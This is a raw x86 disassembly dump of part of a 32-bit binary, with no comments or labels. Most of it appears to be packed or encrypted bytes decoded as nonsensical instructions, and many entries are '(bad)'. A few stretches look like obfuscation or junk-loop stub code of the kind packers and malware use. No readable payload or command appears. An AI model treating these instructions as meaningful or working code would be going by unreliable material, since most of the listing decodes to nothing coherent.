  40da67:	mov    DWORD PTR [edi],0xf6ebd185
  40da6d:	cmp    DWORD PTR [edi+0x45],esi
  40da70:	sub    al,0x2
  40da72:	cmp    bl,ah
  40da74:	mov    eax,ds:0xb5f1b99
  40da79:	call   0xaee2:0x14db1817
  40da80:	lahf   
  40da81:	icebp  
  40da82:	inc    edi
  40da83:	jb     0x40da55
  40da85:	push   eax
  40da86:	pop    edx
  40da87:	adc    BYTE PTR [ebp-0x39],ch
  40da8a:	jmp    0xf68f:0x65ba7dab
  40da91:	mov    dh,0xb8
  40da93:	or     BYTE PTR [edx+0xebf1f77],cl
  40da99:	sbb    al,0x92
  40da9b:	mov    dh,0x7c
  40da9d:	xchg   ebx,eax
  40da9e:	rol    BYTE PTR [ebx+0x13a70338],cl
  40daa4:	rsm    
  40daa6:	sbb    bh,BYTE PTR [ecx-0x22]
  40daa9:	dec    esi
  40daaa:	dec    edx
  40daab:	stos   BYTE PTR es:[edi],al
  40daac:	or     al,0x3b
  40daae:	adc    DWORD PTR [eax-0x430ad7cd],ebx
  40dab4:	ret    0xb862
  40dab7:	push   ds
  40dab8:	and    esp,DWORD PTR [eax+0x3e]
  40dabb:	push   0x6d71f59f
  40dac0:	push   ss
  40dac1:	lods   eax,DWORD PTR ds:[esi]
  40dac2:	add    al,0xd8
  40dac4:	jmp    0xf862:0x2e4985f7
  40dacb:	inc    ebp
  40dacc:	retf   
  40dacd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dace:	jmp    0x6479fb94
  40dad3:	pop    ds
  40dad4:	aam    0xfa
  40dad6:	cld    
  40dad7:	xchg   ebx,eax
  40dad8:	add    al,0xdd
  40dada:	sbb    al,BYTE PTR [ecx-0x65]
  40dadd:	and    esp,ebx
  40dadf:	pop    ebx
  40dae0:	mov    ch,0xf1
  40dae2:	jno    0x40db48
  40dae4:	inc    BYTE PTR es:[ebp+esi*1+0x36]
  40dae9:	loopne 0x40db37
  40daeb:	js     0x40daec
  40daed:	pushf  
  40daee:	clc    
  40daef:	jecxz  0x40dad6
  40daf1:	(bad)  
  40daf3:	mov    al,ds:0xcac483d2
  40daf8:	(bad)  
  40daf9:	out    dx,al
  40dafa:	mov    ecx,DWORD PTR [ebx-0x70]
  40dafd:	aam    0xdc
  40daff:	jp     0x40da89
  40db01:	and    al,0x24
  40db03:	in     eax,0xdc
  40db05:	lods   eax,DWORD PTR ds:[esi]
  40db06:	stos   DWORD PTR es:[edi],eax
  40db07:	lea    edi,[esi+0x303a793b]
  40db0d:	xchg   esi,eax
  40db0e:	mov    ds:0x7754f537,eax
  40db13:	or     DWORD PTR [edx-0x77],eax
  40db16:	shr    BYTE PTR [esp+ebp*2-0x7b5794f2],0x99
  40db1e:	outs   dx,DWORD PTR ds:[esi]
  40db1f:	pop    ebp
  40db20:	pop    ds
  40db21:	in     eax,dx
  40db22:	imul   esp,DWORD PTR [esi+0x7e],0x7dae0084
  40db29:	cs fs test al,0x79
  40db2d:	add    BYTE PTR [esi+0x3594b750],cl
  40db33:	enter  0x4428,0xa0
  40db37:	mov    esp,0x4d903bd3
  40db3c:	pop    ebx
  40db3d:	popa   
  40db3e:	fwait
  40db3f:	call   0x8c3c:0x3caf5f2f
  40db46:	adc    DWORD PTR [edi],ecx
  40db48:	add    ecx,ecx
  40db4a:	pop    esi
  40db4b:	mov    ds:0x8b6ce6a4,al
  40db50:	(bad)  
  40db51:	and    BYTE PTR [edx+0xbbe6388],bh
  40db57:	sub    BYTE PTR [edi],0x29
  40db5a:	rcl    DWORD PTR [ebx-0x23],cl
  40db5d:	xor    ch,BYTE PTR [edx+edx*1+0x1]
  40db61:	pop    ebx
  40db62:	rcl    al,0x7d
  40db65:	mov    eax,0xce7580
  40db6a:	mov    esp,0xfc08e63e
  40db6f:	add    ecx,DWORD PTR [esi]
  40db71:	mov    ebx,0x64d020bc
  40db76:	and    eax,0xcae37d11
  40db7b:	lods   al,BYTE PTR ds:[esi]
  40db7c:	bound  edx,QWORD PTR [eax-0x41ce7199]
  40db82:	inc    BYTE PTR [edx]
  40db84:	pop    edx
  40db85:	aas    
  40db86:	pop    ecx
  40db87:	hlt    
  40db88:	fdivr  DWORD PTR [esi-0x41a5bae9]
  40db8e:	hlt    
  40db8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db90:	addr16 mov ebp,0x9072fdae
  40db96:	or     BYTE PTR ds:0xa0fb58ca,ah
  40db9c:	aad    0xc
  40db9e:	in     eax,0x27
  40dba0:	in     eax,dx
  40dba1:	aas    
  40dba2:	dec    eax
  40dba3:	loop   0x40dc1b
  40dba5:	loopne 0x40dc03
  40dba7:	aad    0xb5
  40dba9:	out    0xe7,al
  40dbab:	pop    ebx
  40dbac:	sbb    al,0xd5
  40dbae:	test   al,0xde
  40dbb0:	std    
  40dbb1:	inc    ebp
  40dbb2:	into   
  40dbb3:	retf   
  40dbb4:	jnp    0x40dbf1
  40dbb6:	ror    DWORD PTR [edi],0x85
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x7a40145c],0xfa2aebf8
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc11
  40dbe0:	dec    edx
  40dbe1:	xor    BYTE PTR ds:0xc2a7aa62,0x76
  40dbe8:	xor    DWORD PTR [eax+0x31],0x6b
  40dbec:	push   edi
  40dbed:	dec    ebp
  40dbee:	adc    edx,esp
  40dbf0:	dec    ecx
  40dbf1:	pop    ebx
  40dbf2:	jmp    0x26bdcd8f
  40dbf7:	pop    esp
  40dbf8:	retf   0x50ad
  40dbfb:	ins    BYTE PTR es:[edi],dx
  40dbfc:	mov    eax,0x3e216b3a
  40dc01:	js     0x40db89
  40dc03:	sub    al,ah
  40dc05:	and    ah,dh
  40dc07:	mov    ebx,0x2cac7689
  40dc0c:	inc    ecx
  40dc0d:	mov    al,0x79
  40dc0f:	cli    
  40dc10:	std    
  40dc11:	mov    dl,0xa2
  40dc13:	aas    
  40dc14:	ss fwait
  40dc16:	inc    esp
  40dc17:	cdq    
  40dc18:	inc    edx
  40dc19:	stos   DWORD PTR es:[edi],eax
  40dc1a:	aad    0x45
  40dc1c:	cmp    bl,0xf5
  40dc1f:	push   ebx
  40dc20:	dec    edi
  40dc21:	dec    edi
  40dc22:	clc    
  40dc23:	ret    0x4a3f
  40dc26:	mov    al,0xc
  40dc28:	imul   BYTE PTR [esi-0x1]
  40dc2b:	test   al,0x49
  40dc2d:	out    0xcc,eax
  40dc2f:	jns    0x40dbf8
  40dc31:	inc    esi
  40dc32:	xchg   esp,ecx
  40dc34:	or     esp,DWORD PTR [esi+edi*1+0x69]
  40dc38:	jle    0x40dbc2
  40dc3a:	nop
  40dc3b:	pusha  
  40dc3c:	pop    ecx
  40dc3d:	lahf   
  40dc3e:	pop    esi
  40dc3f:	call   0xaefd49bd
  40dc44:	outs   dx,BYTE PTR ds:[esi]
  40dc45:	push   ebx
  40dc47:	scas   eax,DWORD PTR es:[edi]
  40dc48:	pop    eax
  40dc49:	nop
  40dc4a:	aaa    
  40dc4b:	add    bl,BYTE PTR [ebp+ebp*8+0x0]
  40dc4f:	test   eax,0x1df63f69
  40dc54:	enter  0x46a4,0xa7
  40dc58:	cmp    BYTE PTR [eax],dl
  40dc5a:	fistp  DWORD PTR [ecx]
  40dc5c:	jnp    0x40dcc5
  40dc5e:	adc    bh,BYTE PTR [ebp-0x7a6db52d]
  40dc64:	pusha  
  40dc65:	mov    BYTE PTR [esi],0x3c
  40dc68:	mov    eax,ds:0xc7bc0946
  40dc6d:	fistp  WORD PTR [ecx+0x58]
  40dc70:	sub    DWORD PTR [ebx],ebp
  40dc72:	or     bl,BYTE PTR [ecx-0x1e28350a]
  40dc78:	xor    eax,0x38f8fbf0
  40dc7d:	sbb    ecx,0x998fcc0e
  40dc83:	sbb    ch,BYTE PTR [bx-0x13d1]
  40dc88:	xchg   edi,eax
  40dc89:	jg     0x40dcd8
  40dc8b:	mov    cl,0x5a
  40dc8d:	xor    eax,0x14abdbaa
  40dc92:	jmp    0xfbd0:0x23b0e169
  40dc99:	inc    esp
  40dc9a:	sbb    al,0x2d
  40dc9c:	mov    dh,0x19
  40dc9e:	in     al,dx
  40dc9f:	cmp    BYTE PTR [edi-0x15],bh
  40dca2:	shl    BYTE PTR [eax+0x6e666c93],cl
  40dca8:	xor    esp,DWORD PTR [edx+0x5]
  40dcab:	test   BYTE PTR [ebp+eiz*4-0x4],ah
  40dcaf:	cmp    eax,ebx
  40dcb1:	in     al,0x67
  40dcb3:	and    ebx,DWORD PTR [ecx+0x75]
  40dcb6:	mov    bh,0x41
  40dcb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcb9:	jnp    0x40dc99
  40dcbb:	fs xchg esi,eax
  40dcbd:	mov    esp,0x1567131d
  40dcc2:	ja     0x40dcff
  40dcc4:	ss mov esi,0xb58e4b03
  40dcca:	mov    dl,0x8b
  40dccc:	or     al,0x17
  40dcce:	inc    ebx
  40dccf:	sbb    DWORD PTR [edx],ebx
  40dcd1:	gs cli 
  40dcd3:	jo     0x40dd33
  40dcd5:	jbe    0x40dcf8
  40dcd7:	jle    0x40dcde
  40dcd9:	jmp    0x3378:0x26a41e59
  40dce0:	mov    bl,0xda
  40dce2:	adc    eax,0xa46f23d6
  40dce7:	dec    esp
  40dce8:	lods   al,BYTE PTR ds:[esi]
  40dce9:	and    ecx,DWORD PTR [esp+edi*8]
  40dcec:	sub    eax,0x5fbb232a
  40dcf1:	out    0x6,eax
  40dcf3:	inc    ebp
  40dcf4:	jp     0x40dc9d
  40dcf6:	jb     0x40dd29
  40dcf8:	and    dl,BYTE PTR [edx]
  40dcfa:	mov    bh,BYTE PTR [ebx+0x3f]
  40dcfd:	xor    ecx,esp
  40dcff:	popf   
  40dd00:	js     0x40dd11
  40dd02:	sahf   
  40dd03:	or     BYTE PTR [ecx-0x32],dh
  40dd06:	pushw  ds
  40dd08:	out    dx,eax
  40dd09:	sub    edx,edx
  40dd0b:	call   0xff7f6e19
  40dd10:	aas    
  40dd11:	fisub  DWORD PTR [ebx+esi*8]
  40dd14:	imul   ebp,DWORD PTR [ebp-0x52],0xffffffae
  40dd18:	ins    DWORD PTR es:[edi],dx
  40dd19:	rcl    BYTE PTR [ebx],0xed
  40dd1c:	and    esp,ebx
  40dd1e:	push   es
  40dd1f:	xchg   ebx,eax
  40dd20:	mov    dh,0xf2
  40dd22:	call   0xc05a0481
  40dd27:	jge    0x40dd21
  40dd29:	add    DWORD PTR [edx+0x56],edx
  40dd2c:	ds das 
  40dd2e:	dec    ebx
  40dd2f:	out    0x8b,al
  40dd31:	pop    ds
  40dd32:	repnz ror cl,cl
  40dd35:	not    BYTE PTR [edi+0x102be93e]
  40dd3b:	adc    al,0xcf
  40dd3d:	xchg   edx,eax
  40dd3e:	or     BYTE PTR [ecx-0x36],bl
  40dd41:	ins    DWORD PTR es:[edi],dx
  40dd42:	mov    esp,0xbfd22b5a
  40dd47:	sbb    al,0xee
  40dd49:	jmp    0x1bf2:0x93da9380
  40dd50:	fs lahf 
  40dd52:	dec    esi
  40dd53:	dec    edi
  40dd54:	into   
  40dd55:	stos   DWORD PTR es:[edi],eax
  40dd56:	push   ebx
  40dd57:	adc    edi,DWORD PTR [edx+0x22]
  40dd5a:	push   es
  40dd5b:	dec    ebx
  40dd5c:	rol    BYTE PTR [esi],cl
  40dd5e:	and    bl,ch
  40dd60:	sub    ch,BYTE PTR [ebx-0x12983ee1]
  40dd66:	inc    edx
  40dd67:	sub    DWORD PTR [edi+0x478e36f4],eax
  40dd6d:	jb     0x40dd92
  40dd6f:	ins    DWORD PTR es:[edi],dx
  40dd70:	xchg   ecx,eax
  40dd71:	sbb    bl,BYTE PTR [eax+0xcc24745]
  40dd77:	(bad)  
  40dd78:	iret   
  40dd79:	mov    esp,0xdb7a3fe6
  40dd7e:	cmp    dl,BYTE PTR [ebx]
  40dd80:	pop    edi
  40dd81:	mov    esp,0x8714b797
  40dd86:	inc    dx
  40dd88:	jl     0x40dd57
  40dd8a:	bound  eax,QWORD PTR [ebx]
  40dd8c:	inc    esi
  40dd8d:	sub    ebp,ecx
  40dd8f:	pop    ds
  40dd90:	xor    BYTE PTR [edi-0x1d],ch
  40dd93:	push   eax
  40dd94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd95:	aam    0xf8
  40dd97:	xor    bh,BYTE PTR [ecx]
  40dd99:	(bad)  
  40dd9a:	or     al,0xf
  40dd9c:	sub    al,0xc4
  40dd9e:	ds and al,0xf7
  40dda1:	push   esi
  40dda2:	div    BYTE PTR [esi+0x4c]
  40dda5:	dec    ebp
  40dda6:	sub    al,0x3d
  40dda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dda9:	int3   
  40ddaa:	hlt    
  40ddab:	leave  
  40ddac:	sbb    eax,0x598cbd75
  40ddb1:	or     bh,BYTE PTR [ecx+0xe]
  40ddb4:	(bad)  
  40ddb5:	add    bl,ch
  40ddb7:	and    al,0x4b
  40ddb9:	(bad)  
  40ddba:	mov    ch,0x35
  40ddbc:	add    BYTE PTR [edi],0x7c
  40ddbf:	xchg   DWORD PTR [esi+0x67abd00a],esp
  40ddc5:	xchg   esi,eax
  40ddc6:	jnp    0x40ddbf
  40ddc8:	push   ebp
  40ddc9:	lds    ebp,FWORD PTR [ebx+0xf442207]
  40ddcf:	fcom   DWORD PTR [esi+0x15]
  40ddd2:	es jmp 0x40dde2
  40ddd5:	sbb    al,0x41
  40ddd7:	mov    cs,WORD PTR [ebx-0x76b90f09]
  40dddd:	sbb    al,0xb3
  40dddf:	fs in  eax,0xea
  40dde2:	jmp    0x9c16af91
  40dde7:	dec    ebp
  40dde8:	adc    esi,DWORD PTR [edi+0x29597cad]
  40ddee:	inc    eax
  40ddef:	xor    ecx,ecx
  40ddf1:	jp     0x40ddf4
  40ddf3:	push   ebp
  40ddf4:	(bad)  
  40ddf5:	or     eax,0xb65a3596
  40ddfa:	push   ebx
  40ddfb:	inc    ecx
  40ddfc:	scas   eax,DWORD PTR es:[edi]
  40ddfd:	(bad)  
  40ddfe:	repz or bh,dh
  40de01:	push   eax
  40de02:	outs   dx,DWORD PTR ds:[esi]
  40de03:	sahf   
  40de04:	dec    esi
  40de05:	fucomp st(7)
  40de07:	lock mov al,ds:0xabb9f608
  40de0d:	pop    ds
  40de0e:	inc    esp
  40de0f:	sub    DWORD PTR [eax],esp
  40de11:	test   DWORD PTR [ebx-0x3c15df5a],esp
  40de17:	cmp    edx,edi
  40de19:	in     al,dx
  40de1a:	mov    al,ds:0xc1a91a37
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	neg    DWORD PTR [ebp-0x5c]
  40dea8:	sbb    ebp,ecx
  40deaa:	mov    edx,0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40de3a
  40deb3:	sti    
  40deb4:	push   ebx
  40deb5:	push   ds
  40deb6:	add    eax,eax
  40deb8:	pop    ebx
  40deb9:	ja     0x40dea5
  40debb:	test   BYTE PTR [esi],al
  40debd:	lods   eax,DWORD PTR ds:[esi]
  40debe:	or     BYTE PTR [esi],bl
  40dec0:	cmp    dl,dl
  40dec2:	mov    bh,0xfd
  40dec4:	inc    ebp
  40dec5:	lds    eax,FWORD PTR [eax+0x75]
  40dec8:	hlt    
  40dec9:	and    eax,DWORD PTR [eax]
  40decb:	or     cl,BYTE PTR [edx-0x1aae9e37]
  40ded1:	fisub  WORD PTR [ecx+ebx*2+0x698336de]
  40ded8:	jl     0x40de79
  40deda:	or     DWORD PTR [eax],esi
  40dedc:	scas   al,BYTE PTR es:[edi]
  40dedd:	push   ebx
  40dede:	jo     0x40df07
  40dee0:	pop    edx
  40dee1:	sub    eax,0x89d2e09f
  40dee6:	sahf   
  40dee7:	push   esi
  40dee8:	imul   BYTE PTR [esi-0x4e]
  40deeb:	adc    BYTE PTR [ecx+0x7e],ch
  40deee:	das    
  40deef:	div    DWORD PTR [bp+0x76c3]
  40def4:	jp     0x40de86
  40def6:	mov    esp,0xb9f303bf
  40defb:	lds    edi,FWORD PTR [ebx+0x645e09a5]
  40df01:	out    dx,eax
  40df02:	sbb    DWORD PTR [edi+0x42],esi
  40df05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df06:	inc    edx
  40df07:	mov    cl,0x64
  40df09:	jge    0x40dea3
  40df0b:	out    dx,eax
  40df0c:	ins    DWORD PTR es:[edi],dx
  40df0d:	sbb    bh,BYTE PTR [ebx-0x7621f9cb]
  40df13:	dec    ebp
  40df14:	inc    edi
  40df15:	daa    
  40df16:	gs xchg edx,eax
  40df18:	lds    ecx,FWORD PTR [eax-0x43]
  40df1b:	xchg   edx,eax
  40df1c:	xchg   esp,eax
  40df1d:	sub    dl,ah
  40df1f:	ins    BYTE PTR es:[edi],dx
  40df20:	fisttp QWORD PTR [esi+esi*8]
  40df23:	rcl    DWORD PTR [ebx],0x80
  40df26:	push   es
  40df27:	in     eax,dx
  40df28:	aas    
  40df29:	mov    al,0x30
  40df2b:	inc    eax
  40df2c:	in     eax,dx
  40df2d:	ret    0x10c
  40df30:	scas   eax,DWORD PTR es:[edi]
  40df31:	inc    esi
  40df32:	icebp  
  40df33:	push   eax
  40df34:	pop    edi
  40df35:	(bad)  
  40df36:	mov    dl,0x99
  40df38:	jo     0x40df3e
  40df3a:	cmc    
  40df3b:	aam    0xb6
  40df3d:	mov    edi,0xb7900219
  40df42:	jo     0x40df1e
  40df44:	sbb    DWORD PTR [edx-0x3c],edi
  40df47:	sti    
  40df48:	sub    BYTE PTR [esi+eiz*2-0x2ddb6f9e],0x93
  40df50:	fcom   QWORD PTR [esi+ecx*2-0x61]
  40df54:	(bad)  
  40df55:	shr    BYTE PTR [edi-0x27],cl
  40df58:	jb     0x40deeb
  40df5a:	cs mov ebx,0x9f6ee395
  40df60:	cmp    edx,DWORD PTR [eax-0x73]
  40df63:	pop    es
  40df64:	fisttp DWORD PTR [esi-0x78]
  40df67:	ins    DWORD PTR es:[edi],dx
  40df68:	iret   
  40df69:	mov    ebx,edx
  40df6b:	push   ds
  40df6c:	push   0x956b6a56
  40df71:	clc    
  40df72:	sub    DWORD PTR [ebp+0x2f0ad569],0x5c452658
  40df7c:	sbb    al,0xf
  40df7e:	push   edx
  40df7f:	adc    al,0x5c
  40df81:	ins    DWORD PTR es:[edi],dx
  40df82:	pop    ecx
  40df83:	in     eax,0xb6
  40df85:	or     DWORD PTR [ebp-0x221797fd],ebp
  40df8b:	mov    esi,0xd25b1753
  40df90:	or     ch,BYTE PTR [edx-0x26b45325]
  40df96:	mov    esi,0x26bba221
  40df9b:	fisubr WORD PTR [edx-0x19]
  40df9e:	aad    0xdb
  40dfa0:	in     al,0xe
  40dfa2:	(bad)  
  40dfa4:	jmp    0x1e99:0x52286cb6
  40dfab:	jg     0x40df63
  40dfad:	mov    eax,0x954e9a3d
  40dfb2:	xor    al,0xfb
  40dfb4:	std    
  40dfb5:	outs   dx,DWORD PTR ds:[esi]
  40dfb6:	push   ebx
  40dfb7:	nop
  40dfb8:	sub    BYTE PTR [esi-0x624d40a9],dl
  40dfbe:	add    DWORD PTR [ecx],ebx
  40dfc0:	mov    esi,0xb0dd0b3
  40dfc5:	xlat   BYTE PTR ds:[ebx]
  40dfc6:	ss sbb ch,bh
  40dfc9:	fistp  QWORD PTR [esp+edx*8-0x54]
  40dfcd:	inc    ecx
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	addr16 push ds
  40e005:	std    
  40e006:	add    DWORD PTR [esi-0x63],ebx
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e04c
  40e010:	in     al,dx
  40e011:	pop    edx
  40e012:	ins    DWORD PTR es:[edi],dx
  40e013:	mov    ds:0x72ed5132,eax
  40e018:	xor    bl,bh
  40e01a:	sub    dh,BYTE PTR [ecx-0xf]
  40e01d:	aam    0x79
  40e01f:	xchg   ebp,eax
  40e020:	cmc    
  40e021:	adc    BYTE PTR [ebp-0x1f],ch
  40e024:	imul   ebx,DWORD PTR [edi+0x63],0x961dd1e7
  40e02b:	pushf  
  40e02c:	inc    ecx
  40e02d:	jecxz  0x40e00b
  40e02f:	cmp    eax,0x7dd41a22
  40e034:	cld    
  40e035:	ds push esi
  40e037:	sub    dl,BYTE PTR [edx]
  40e039:	cwde   
  40e03a:	mov    DWORD PTR [ecx],ecx
  40e03c:	fidiv  DWORD PTR [ebp+0x33]
  40e03f:	or     dl,BYTE PTR cs:[ebp+0xf]
  40e043:	loopne 0x40e04d
  40e045:	and    DWORD PTR [ebp+0x563d2907],ebp
  40e04b:	shr    DWORD PTR [ebx+eax*2-0x185cb329],cl
  40e052:	mov    edx,0xdc7c3b64
  40e057:	ds enter 0xd768,0x34
  40e05c:	mov    esp,0x71d032b1
  40e061:	arpl   bp,bx
  40e063:	cmp    BYTE PTR [ecx-0x4f5cbb0d],dl
  40e069:	push   edi
  40e06a:	fldenv [eax]
  40e06c:	test   eax,0xd6ff0961
  40e071:	jl     0x40e0df
  40e073:	outs   dx,BYTE PTR ds:[esi]
  40e074:	inc    ebx
  40e075:	mov    esi,0x873cc189
  40e07a:	adc    al,0x9b
  40e07c:	jg     0x40e077
  40e07e:	sbb    BYTE PTR [eax+0x7f],dh
  40e081:	pop    ds
  40e082:	jae    0x40e095
  40e084:	shl    DWORD PTR [edx],cl
  40e086:	sbb    eax,0x1857e564
  40e08b:	cmp    dh,ah
  40e08d:	mov    ds:0xe181f96a,eax
  40e092:	addr16 xchg esp,eax
  40e094:	inc    ecx
  40e095:	lods   al,BYTE PTR ds:[si]
  40e097:	mov    eax,ds:0x2b01a1bd
  40e09c:	xchg   ebp,eax
  40e09d:	hlt    
  40e09e:	jbe    0x40e100
  40e0a0:	lods   eax,DWORD PTR ds:[esi]
  40e0a1:	outs   dx,DWORD PTR ds:[esi]
  40e0a2:	(bad)  
  40e0a3:	push   ds
  40e0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a5:	xchg   ecx,eax
  40e0a6:	and    al,0xd9
  40e0a8:	lods   al,BYTE PTR ds:[esi]
  40e0a9:	scas   eax,DWORD PTR es:[edi]
  40e0aa:	mov    ch,0x46
  40e0ac:	enter  0xac21,0x21
  40e0b0:	add    eax,0x37335634
  40e0b5:	pop    edi
  40e0b6:	xchg   edi,eax
  40e0b7:	pushf  
  40e0b8:	cmp    cl,BYTE PTR [ebp-0x32a33c12]
  40e0be:	cmp    esi,DWORD PTR [edx-0x15]
  40e0c1:	call   0x2c5f18a7
  40e0c6:	pop    edi
  40e0c7:	in     eax,0xab
  40e0c9:	popa   
  40e0ca:	into   
  40e0cb:	mov    ds:0x199185cb,al
  40e0d1:	and    eax,0xddacb43d
  40e0d6:	pop    edx
  40e0d7:	dec    eax
  40e0d8:	push   esi
  40e0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0da:	cli    
  40e0db:	mov    eax,0xac0b9208
  40e0e0:	mov    edx,0x427e4314
  40e0e5:	and    eax,0x8df7033a
  40e0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0eb:	mov    esp,0x4e4550f0
  40e0f0:	or     esp,eax
  40e0f2:	aaa    
  40e0f3:	xchg   edi,eax
  40e0f4:	(bad)  
  40e0f7:	daa    
  40e0f8:	pop    edx
  40e0f9:	adc    al,0x25
  40e0fb:	xor    ebx,esp
  40e0fd:	aam    0x2e
  40e0ff:	stos   DWORD PTR es:[edi],eax
  40e100:	sahf   
  40e101:	loop   0x40e178
  40e103:	inc    eax
  40e104:	cmp    DWORD PTR [edx-0x1968758d],0xe998cbdc
  40e10e:	xchg   esi,eax
  40e10f:	xchg   DWORD PTR [ebx],edx
  40e111:	gs pusha 
  40e113:	dec    ecx
  40e114:	add    eax,0x7f34c5d8
  40e119:	add    edi,eax
  40e11b:	bound  ecx,QWORD PTR [ebp+0x7f]
  40e11e:	aas    
  40e11f:	jae    0x40e123
  40e121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e122:	fcmovnu st,st(0)
  40e124:	xchg   ebx,eax
  40e125:	mov    ebp,DWORD PTR [ebp+esi*8-0x69]
  40e129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e12a:	mov    ch,0x33
  40e12c:	mov    BYTE PTR [ecx+0x4337a315],0x0
  40e133:	xchg   edi,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	mov    eax,ds:0x72dc5773
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	adc    BYTE PTR [edx-0x31],0x39
  40e16a:	icebp  
  40e16b:	test   DWORD PTR [edi-0x4b],esi
  40e16e:	(bad)
  40e171:	add    DWORD PTR [eax+0x58315502],0xffffffea
  40e178:	ss inc ecx
  40e17a:	in     al,dx
  40e17b:	cdq    
  40e17c:	mov    bl,0x13
  40e17e:	fld    DWORD PTR [ecx]
  40e180:	mov    esp,0x61eb1afc
  40e185:	mov    bh,0x9e
  40e187:	shl    esi,0x60
  40e18a:	ins    BYTE PTR es:[edi],dx
  40e18b:	cmp    ebx,DWORD PTR ds:0x41b76beb
  40e191:	repz and eax,0xba6c2b37
  40e197:	or     DWORD PTR [ecx-0x4e],edx
  40e19a:	popf   
  40e19b:	fnstsw WORD PTR [ebp-0xef2b4e2]
  40e1a1:	sbb    BYTE PTR [ebp+0x322ef862],dl
  40e1a7:	dec    BYTE PTR [eax+0x447995f2]
  40e1ad:	aad    0x78
  40e1af:	aas    
  40e1b0:	int    0xc3
  40e1b2:	mov    dl,0x9d
  40e1b4:	mov    cx,cs
  40e1b7:	and    DWORD PTR ds:0x15e97887,esi
  40e1bd:	sahf   
  40e1be:	mov    eax,0x4b5159db
  40e1c3:	hlt    
  40e1c4:	pop    ds
  40e1c5:	sub    BYTE PTR [edi],bh
  40e1c7:	or     al,0x23
  40e1c9:	sbb    BYTE PTR ds:0x7f5edeb4,bl
  40e1cf:	add    eax,0x1bbf41b7
  40e1d4:	pop    ecx
  40e1d5:	adc    al,0x80
  40e1d7:	test   BYTE PTR [esi],0x94
  40e1da:	sub    DWORD PTR [ebp-0x80],ebx
  40e1dd:	xchg   BYTE PTR [edi-0xf0d423d],al
  40e1e3:	(bad)  
  40e1e4:	mov    edx,0x1b821e27
  40e1e9:	stc    
  40e1ea:	lds    edx,FWORD PTR [edx-0x4127216a]
  40e1f0:	sub    al,0x16
  40e1f2:	sub    BYTE PTR [ecx+ebp*1+0x7c6f6e1c],bl
  40e1f9:	inc    esp
  40e1fa:	nop
  40e1fb:	call   0xb12f3e24
  40e200:	adc    ebx,DWORD PTR [ecx+0x4113ced6]
  40e206:	xor    BYTE PTR [edx-0x5516596c],bh
  40e20c:	xchg   BYTE PTR [edx+esi*4-0x4b],bh
  40e210:	fistp  WORD PTR [edi]
  40e212:	mov    ds:0x64d686be,al
  40e217:	push   cs
  40e218:	rol    dh,cl
  40e21a:	adc    ebx,DWORD PTR [ebp+0x32]
  40e21d:	xchg   esi,eax
  40e21e:	(bad)  [esi+0x53]
